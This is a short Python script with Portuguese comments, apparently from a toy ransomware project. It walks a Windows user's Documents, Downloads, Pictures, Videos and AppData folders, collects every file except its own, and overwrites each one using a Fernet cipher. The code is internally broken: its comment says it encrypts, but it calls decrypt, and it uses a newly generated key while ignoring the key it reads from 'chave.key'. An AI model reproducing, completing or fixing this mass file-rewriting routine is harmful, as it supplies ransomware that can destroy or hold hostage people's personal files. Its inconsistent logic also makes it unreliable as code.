import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()#cria a chave de criptografia
with open('chave.key', 'rb') as chave:
    chave_secreta = chave.read()

username = os.getenv('USERNAME')  # Pega o usuário do computador

folders = [
    os.path.join(r'C:\Users', username, 'Documents'),
    os.path.join(r'C:\Users', username, 'Downloads'),
    os.path.join(r'C:\Users', username, 'Pictures'),
    os.path.join(r'C:\Users', username, 'Videos'),
    os.path.join(r'C:\Users', username, 'AppData', 'Local'),
    os.path.join(r'C:\Users', username, 'AppData', 'Roaming')
]

arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:

            if file in ["alfredo.py", 'chave.key', 'desktop.ini']:
                continue

            file_path = os.path.join(root, file)
            arquivos.append(file_path)


#criptografar arquivos 
for arquivo in arquivos:
    with open(arquivo, 'rb') as file:
        conteudo = file.read()
    
    conteudo_descriptografado = Fernet(key).decrypt(conteudo)
    
    with open(arquivo, 'wb') as file:
        file.write(conteudo_descriptografado)